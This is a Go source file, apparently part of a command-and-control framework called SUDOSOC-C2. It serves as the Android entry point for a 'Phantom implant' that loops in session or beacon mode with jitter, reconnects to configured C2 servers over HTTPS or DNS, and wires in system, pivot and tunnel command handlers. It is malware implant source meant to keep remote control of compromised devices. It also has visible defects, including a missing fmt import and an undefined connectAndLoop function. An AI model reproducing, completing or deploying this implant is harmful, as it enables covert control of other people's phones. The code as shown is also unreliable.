//go:build android

package runner

/*
	SUDOSOC-C2 Framework — Android Runner
	Copyright (C) 2026  sudosoc — Seif

	Android-specific entry point for the Phantom implant.
	Bypasses all Windows-specific imports and uses the generic
	HTTP/HTTPS and DNS transports compatible with Android's Linux kernel.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/handlers"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/limits"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/transports"
)

// Main - Android implant entry point
func Main() {
	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	log.Printf("[android] Phantom implant starting on Android")
	// {{end}}

	// Apply operational limits (time, domain, etc.)
	limits.ExecLimits()

	// Handle OS signals for clean shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT, syscall.SIGHUP)

	go func() {
		<-sigCh
		// {{if .Config.Debug}}
		log.Printf("[android] signal received — shutting down")
		// {{end}}
		os.Exit(0)
	}()

	// Start C2 connection loop
	// {{if .Config.IsBeacon}}
	beaconStart()
	// {{else}}
	sessionStart()
	// {{end}}
}

// sessionStart — persistent session mode
func sessionStart() {
	// {{if .Config.Debug}}
	log.Printf("[android] starting session mode")
	// {{end}}

	for {
		err := startC2Loop()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[android] C2 error: %v — reconnecting in %ds", err, reconnectInterval())
			// {{end}}
			time.Sleep(time.Duration(reconnectInterval()) * time.Second)
		}
	}
}

// beaconStart — beacon check-in mode
func beaconStart() {
	// {{if .Config.Debug}}
	log.Printf("[android] starting beacon mode (interval: {{.Config.BeaconInterval}}s)")
	// {{end}}

	for {
		// {{if .Config.Debug}}
		log.Printf("[android] beacon check-in")
		// {{end}}

		err := startC2Loop()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[android] beacon error: %v", err)
			// {{end}}
		}

		// Sleep until next check-in
		// {{if .Config.BeaconJitter}}
		jitter := time.Duration(beaconJitter()) * time.Second
		// {{else}}
		jitter := time.Duration(0)
		// {{end}}
		sleepDur := time.Duration(beaconInterval())*time.Second + jitter
		// {{if .Config.Debug}}
		log.Printf("[android] sleeping for %v until next check-in", sleepDur)
		// {{end}}
		time.Sleep(sleepDur)
	}
}

// startC2Loop establishes C2 connection and processes commands
func startC2Loop() error {
	// Get system handlers for Android
	systemHandlers := handlers.GetSystemHandlers()
	pivotHandlers := handlers.GetSystemPivotHandlers()
	tunnelHandlers := handlers.GetSystemTunnelHandlers()

	_ = systemHandlers
	_ = pivotHandlers
	_ = tunnelHandlers

	// Attempt connection using configured transports
	// Android uses HTTPS > DNS priority (mTLS less common on mobile networks)
	c2URLs := transports.GetAvailableC2s()

	for _, c2URL := range c2URLs {
		// {{if .Config.Debug}}
		log.Printf("[android] trying C2: %s", c2URL)
		// {{end}}

		err := connectAndLoop(c2URL, systemHandlers)
		if err == nil {
			return nil
		}
		// {{if .Config.Debug}}
		log.Printf("[android] %s failed: %v", c2URL, err)
		// {{end}}
	}

	return fmt.Errorf("all C2 channels failed")
}

func reconnectInterval() int {
	// {{if .Config.ReconnectInterval}}
	return {{.Config.ReconnectInterval}}
	// {{else}}
	return 60
	// {{end}}
}

func beaconInterval() int {
	// {{if .Config.BeaconInterval}}
	return int({{.Config.BeaconInterval}}.Seconds())
	// {{else}}
	return 60
	// {{end}}
}

func beaconJitter() int {
	// {{if .Config.BeaconJitter}}
	return int({{.Config.BeaconJitter}}.Seconds() * 0.4)
	// {{else}}
	return 0
	// {{end}}
}
